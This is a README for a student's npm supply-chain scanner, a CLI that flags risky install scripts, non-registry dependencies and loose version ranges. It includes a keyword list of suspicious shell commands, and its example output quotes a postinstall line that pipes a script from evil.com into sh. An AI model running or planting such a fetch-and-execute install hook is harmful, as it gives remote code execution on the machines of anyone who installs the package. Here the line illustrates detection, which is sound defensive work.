# npm-supply-chain-guard

A small CLI tool I built to catch risky npm dependencies before they end up
in a project — things like malicious install scripts, tampered packages, or
dependencies pulled from somewhere other than the registry.

## Why I built this

Every project pulls in dozens (sometimes hundreds) of third-party packages,
and most of us never actually look at what those packages do when they
install. A `postinstall` script can run pretty much anything — curl a file
from somewhere and pipe it into `bash`, for example — and nobody notices
until something breaks.

This isn't a replacement for `npm audit` or a full vulnerability scanner.
It's a static check that flags obviously risky patterns before you even
run `npm install`.

## What it checks for

- Lifecycle scripts that run automatically (`preinstall`, `install`,
  `postinstall`, etc.) and what commands they actually run
- Suspicious commands inside those scripts — `curl`, `wget`, `eval`,
  `base64`, `chmod`, `powershell`, `bash`, `sh`
- Dependencies pulled from git URLs or raw http(s) links instead of the
  npm registry
- Loose version ranges (`latest`, `*`, `^`, `~`) that let a dependency
  update itself without you noticing
- `package-lock.json` — flags remote-resolved packages and anything with
  an install script

It's dependency-free and runs entirely on your machine — nothing gets
sent anywhere.

## Install

```bash
git clone https://github.com/doolamdattatreya2025/npm-supply-chain-guard.git
cd npm-supply-chain-guard
npm install
```

Optional, if you want it as a global command:

```bash
npm install -g .
```

## Usage

Scan the current directory:

```bash
node src/index.js .
```

Scan a different project:

```bash
node src/index.js /path/to/project
```

Or, if installed globally:

```bash
npm-supply-chain-guard .
```

## Example output

```
$ npm-supply-chain-guard .

Scanning project: /my-app

[1] Risky lifecycle script: postinstall -> curl http://evil.com/install.sh | sh
[2] Suspicious command in "postinstall": downloads external content with curl
[3] Unsafe version tag: lodash@latest
[4] Wide version range: express@^4.18.2
[5] Dependency has an install script: node_modules/badpkg

5 warnings found.
```

## Tests

```bash
npm test
```

## Where I'd like to take this next

Right now it's a local CLI check, which is useful but limited. Things I'm
considering adding when I get time:

- Exporting results as SARIF so it can plug into CI/CD
- Basic typosquatting detection (e.g. catching `expresss` instead of `express`)
- Digging deeper into nested dependencies instead of just top-level ones

Not committing to a timeline on these — mostly building this alongside
coursework, so progress is a bit uneven.

## Contributing

If you spot a bug, a false positive, or a detection pattern I'm missing,
open an issue or send a PR. Still learning, so feedback is genuinely
welcome.

## License

MIT

---

Built by [Dattatreya](https://github.com/doolamdattatreya2025) — cybersecurity student, still figuring a lot of this out.
